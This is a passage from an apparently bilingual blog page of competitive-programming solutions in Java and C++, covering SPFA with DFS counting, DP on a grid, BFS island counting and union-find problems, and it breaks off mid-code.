class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dp[];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dis[];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span>[] inq;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> map[][];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> vsum, road;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Queue&lt;Integer&gt; que = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">spfa</span><span class="params">(<span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= vsum; i++)</span><br><span class="line">dis[i] = INF;</span><br><span class="line">que.offer(start);</span><br><span class="line">dis[start] = <span class="number">0</span>;</span><br><span class="line">inq[start] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">while</span> (!que.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">int</span> k=que.poll();</span><br><span class="line">inq[k]=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= vsum; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(dis[i]&gt;dis[k]+map[k][i])&#123;</span><br><span class="line">dis[i]=dis[k]+map[k][i];</span><br><span class="line"><span class="keyword">if</span>(!inq[i])</span><br><span class="line">&#123;</span><br><span class="line">que.offer(i);</span><br><span class="line">inq[i]=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (v == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (dp[v] != -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> dp[v];</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vsum; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (map[v][i] != INF &amp;&amp; dis[v] &gt; dis[i])</span><br><span class="line">sum += dfs(i);</span><br><span class="line">&#125;</span><br><span class="line">dp[v] = sum;</span><br><span class="line"><span class="keyword">return</span> dp[v];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line"><span class="keyword">while</span> (in.hasNext()) &#123;</span><br><span class="line">vsum = in.nextInt();</span><br><span class="line"><span class="keyword">if</span> (vsum == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">road = in.nextInt();</span><br><span class="line">dis = <span class="keyword">new</span> <span class="keyword">int</span>[vsum + <span class="number">1</span>];</span><br><span class="line">dp = <span class="keyword">new</span> <span class="keyword">int</span>[vsum + <span class="number">1</span>];</span><br><span class="line">inq = <span class="keyword">new</span> <span class="keyword">boolean</span>[vsum + <span class="number">1</span>];</span><br><span class="line">map = <span class="keyword">new</span> <span class="keyword">int</span>[vsum + <span class="number">1</span>][vsum + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= vsum; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= vsum; j++)</span><br><span class="line">map[i][j] = (i == j ? <span class="number">0</span> : INF);</span><br><span class="line">Arrays.fill(dp, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> u, v, w;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= road; i++) &#123;</span><br><span class="line">u = in.nextInt();</span><br><span class="line">v = in.nextInt();</span><br><span class="line">w = in.nextInt();</span><br><span class="line"></span><br><span class="line">map[u][v] = w;</span><br><span class="line">map[v][u] = w;</span><br><span class="line">&#125;</span><br><span class="line">spfa(<span class="number">2</span>);</span><br><span class="line">System.out.println(dfs(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DP-DFS"><a href="#DP-DFS" class="headerlink" title="DP+DFS"></a>DP+DFS</h4><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1078" target="_blank" rel="noopener">例题|Example</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> location[] =<span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">4</span>];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dir[][] =&#123;&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> map[][];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> sum[][];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dp[][];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> flag;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[x][y]!=<span class="number">0</span>) <span class="keyword">return</span> dp[x][y];</span><br><span class="line"><span class="keyword">int</span> i,j,xx,yy,l=<span class="number">0</span>,temp;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=k;j++)<span class="comment">//最多走多少步 </span></span><br><span class="line">&#123;</span><br><span class="line">xx=x+dir[i][<span class="number">0</span>]*j;</span><br><span class="line">yy=y+dir[i][<span class="number">1</span>]*j;</span><br><span class="line"><span class="keyword">if</span>(xx&gt;n||xx&lt;<span class="number">1</span>||yy&gt;n||yy&lt;<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(map[x][y]&lt;map[xx][yy])&#123;</span><br><span class="line">temp=dfs(xx, yy);</span><br><span class="line">l=Math.max(l,temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dp[x][y]=l+map[x][y];</span><br><span class="line"><span class="keyword">return</span> dp[x][y];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line"><span class="keyword">while</span>(in.hasNext())</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> i,j;</span><br><span class="line"> n=in.nextInt();</span><br><span class="line"> k=in.nextInt();</span><br><span class="line"> <span class="keyword">if</span>(n==-<span class="number">1</span>&amp;&amp;k==-<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line"> map=<span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line"> dp=<span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line"> <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">map[i][j]=in.nextInt();</span><br><span class="line"> <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line"> Arrays.fill(dp[i], <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> System.out.println(dfs(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="广度搜索-Breadth-First-Search"><a href="#广度搜索-Breadth-First-Search" class="headerlink" title="广度搜索|Breadth First Search"></a>广度搜索|Breadth First Search</h3><h4 id="常规BFS-island-problem"><a href="#常规BFS-island-problem" class="headerlink" title="常规BFS(island problem)"></a>常规BFS(island problem)</h4><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201027165154352.png" alt="image-20201027165154352" style="zoom: 80%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//边界条件判断</span></span><br><span class="line">    <span class="keyword">if</span> (grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//统计岛屿的个数</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//两个for循环遍历每一个格子</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; grid.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">            <span class="comment">//只有当前格子是1才开始计算</span></span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] == <span class="string">'1'</span>) &#123;</span><br><span class="line">                <span class="comment">//如果当前格子是1，岛屿的数量加1</span></span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">//然后通过bfs把当前格子的上下左右4</span></span><br><span class="line">                <span class="comment">//个位置为1的都要置为0，因为他们是连着</span></span><br><span class="line">                <span class="comment">//一起的算一个岛屿，</span></span><br><span class="line">                bfs(grid, i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//把当前格子先置为0</span></span><br><span class="line">    grid[x][y] = <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">int</span> n = grid.length;</span><br><span class="line">    <span class="keyword">int</span> m = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">//使用队列，存储的是格子坐标转化的值</span></span><br><span class="line">    Queue &lt; Integer &gt; queue = <span class="keyword">new</span> LinkedList &lt; &gt; ();</span><br><span class="line">    <span class="comment">//我们知道平面坐标是两位数字，但队列中存储的是一位数字，</span></span><br><span class="line">    <span class="comment">//所以这里是把两位数字转化为一位数字</span></span><br><span class="line">    <span class="keyword">int</span> code = x * m + y;</span><br><span class="line">    <span class="comment">//坐标转化的值存放到队列中</span></span><br><span class="line">    queue.add(code);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">//出队</span></span><br><span class="line">        code = queue.poll();</span><br><span class="line">        <span class="comment">//在反转成坐标值（i，j）</span></span><br><span class="line">        <span class="keyword">int</span> i = code / m;</span><br><span class="line">        <span class="keyword">int</span> j = code % m;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; grid[i - <span class="number">1</span>][j] == <span class="string">'1'</span>) &#123; <span class="comment">//上</span></span><br><span class="line">            <span class="comment">//如果上边格子为1，把它置为0，然后加入到队列中</span></span><br><span class="line">            <span class="comment">//下面同理</span></span><br><span class="line">            grid[i - <span class="number">1</span>][j] = <span class="string">'0'</span>;</span><br><span class="line">            queue.add((i - <span class="number">1</span>) * m + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; grid[i + <span class="number">1</span>][j] == <span class="string">'1'</span>) &#123; <span class="comment">//下</span></span><br><span class="line">            grid[i + <span class="number">1</span>][j] = <span class="string">'0'</span>;</span><br><span class="line">            queue.add((i + <span class="number">1</span>) * m + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; <span class="number">0</span> &amp;&amp; grid[i][j - <span class="number">1</span>] == <span class="string">'1'</span>) &#123; <span class="comment">//左</span></span><br><span class="line">            grid[i][j - <span class="number">1</span>] = <span class="string">'0'</span>;</span><br><span class="line">            queue.add(i * m + j - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &lt; m - <span class="number">1</span> &amp;&amp; grid[i][j + <span class="number">1</span>] == <span class="string">'1'</span>) &#123; <span class="comment">//右</span></span><br><span class="line">            grid[i][j + <span class="number">1</span>] = <span class="string">'0'</span>;</span><br><span class="line">            queue.add(i * m + j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="并查集-Disjoint-Set-Union"><a href="#并查集-Disjoint-Set-Union" class="headerlink" title="并查集|Disjoint Set Union"></a>并查集|Disjoint Set Union</h3><h4 id="Find-Gang"><a href="#Find-Gang" class="headerlink" title="Find Gang"></a>Find Gang</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;  </span></span></span><br><span class="line"><span class="keyword">int</span> fa[<span class="number">1005</span>], e[<span class="number">1005</span>], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UF_set</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">fa[i] = i;</span><br><span class="line">e[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x == fa[x] ? x : Find(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r1 = Find(a);</span><br><span class="line"><span class="keyword">int</span> r2 = Find(b);</span><br><span class="line"><span class="keyword">if</span> (r1 != r2)</span><br><span class="line">&#123;</span><br><span class="line">fa[r1] = r2;</span><br><span class="line"><span class="comment">//合并时，若r2有敌人  </span></span><br><span class="line"><span class="keyword">if</span> (e[r2] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//若r1也有敌人  </span></span><br><span class="line"><span class="keyword">if</span> (e[r1] != <span class="number">0</span>)</span><br><span class="line"><span class="comment">//则它们的敌人是朋友  </span></span><br><span class="line">Union(e[r1], e[r2]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">//否则，r2的敌人同时也是r1的敌人  </span></span><br><span class="line">e[r1] = e[r2];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> m, x, y, cnt = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line">UF_set();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>, s, &amp;x, &amp;y);</span><br><span class="line"><span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">'F'</span>)</span><br><span class="line">Union(x, y);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//找到x的祖先，和x同一帮派  </span></span><br><span class="line">x = Find(x);</span><br><span class="line"><span class="comment">//若其祖先没有敌人，则将y当作其敌人，其实就是将y当作这个帮派的敌人  </span></span><br><span class="line"><span class="keyword">if</span> (e[x] == <span class="number">0</span>)</span><br><span class="line">e[x] = y;</span><br><span class="line"><span class="comment">//若其祖先有敌人，则敌人的敌人是朋友，将它的两个敌人合并  </span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Union(e[x], y);</span><br><span class="line"><span class="comment">//对y的操作和对x的雷同  </span></span><br><span class="line">y = Find(y);</span><br><span class="line"><span class="keyword">if</span> (e[y] == <span class="number">0</span>)</span><br><span class="line">e[y] = x;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Union(e[y], x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span> (Find(i) == i)</span><br><span class="line">cnt++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Infection"><a href="#Infection" class="headerlink" title="Infection"></a>Infection</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 30005</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[MAX],pre[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x!=pre[x])</span><br><span class="line"></span><br><span class="line">        <span class="comment">//找到其祖先节点 </span></span><br><span class="line">        pre[x] = <span class="built_in">find</span>(pre[x]);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//由父节点继续向上递归查询 ,并将其父节点变成找到的 </span></span><br><span class="line">    <span class="keyword">return</span> pre[x]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别查询两点的祖先节点。 </span></span><br><span class="line">    <span class="keyword">int</span> prex = <span class="built_in">find</span>(x);</span><br><span class="line">    <span class="keyword">int</span> prey = <span class="built_in">find</span>(y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果二者的祖先节点不一致，那么任意让二者中某一个认另一个为祖先，保证同集合。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prex == prey)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//应该是祖先节点进行组合。而不是当前节点！ </span></span><br><span class="line">    pre[prey] = prex;  </span><br><span class="line">    a[prex] += a[prey];     </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> 